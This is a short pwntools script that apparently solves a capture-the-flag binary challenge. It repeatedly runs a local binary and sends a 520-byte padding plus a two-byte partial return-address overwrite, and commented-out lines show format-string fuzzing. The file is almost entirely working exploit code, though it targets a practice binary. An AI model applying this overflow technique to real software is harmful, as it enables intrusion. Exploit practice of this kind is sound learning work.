from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./the_road_not_taken1', checksec=False)
os.environ["SECRET_MESSAGE"] = "YOKO"

# Let's fuzz 100 values
for j in range(0,100):
    # for i in range(0,10):
    try:
        p = process(level='error')
        # p.sendlineafter(b': ', '%{}$p'.format(i).encode())
        offset = b'A'*520
        # fuzz = 0x1159 + 0x1000*i
        # log.info(fuzz)
        payload = offset + b'\x59\x11'
        # log.info(payload)
        p.recvline()
        p.sendline(payload)
        # result = p.recv().split(b' ')
        # result = result[1].split(b',')
        # leak_char = result[0].ljust(8,b"\x00")
        print(p.recvline())
        print(p.recvline())
        
        # p.close()
    except EOFError:
        pass